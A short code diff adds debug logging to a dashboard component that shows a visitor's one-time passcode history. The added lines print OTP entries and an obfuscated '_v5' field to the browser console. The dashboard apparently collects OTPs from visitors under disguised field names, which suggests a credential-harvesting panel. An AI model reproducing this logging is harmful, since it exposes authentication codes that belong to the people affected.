@@ -269,6 +269,11 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     console.log('[Dashboard] OTP history:', sortedOtpHistory)
     console.log('[Dashboard] OTP from visitor._v5:', (visitor as any)._v5)
     console.log('[Dashboard] OTP Status:', (visitor as any)._v5Status)
+    if (sortedOtpHistory.length > 0) {
+      console.log('[Dashboard] First OTP entry:', sortedOtpHistory[0])
+      console.log('[Dashboard] First OTP entry data:', sortedOtpHistory[0]?.data)
+      console.log('[Dashboard] First OTP entry data._v5:', sortedOtpHistory[0]?.data?._v5)
+    }
     
     // If no history exists but OTP is in main document, create a bubble from it
     if (sortedOtpHistory.length === 0 && (visitor as any)._v5) {
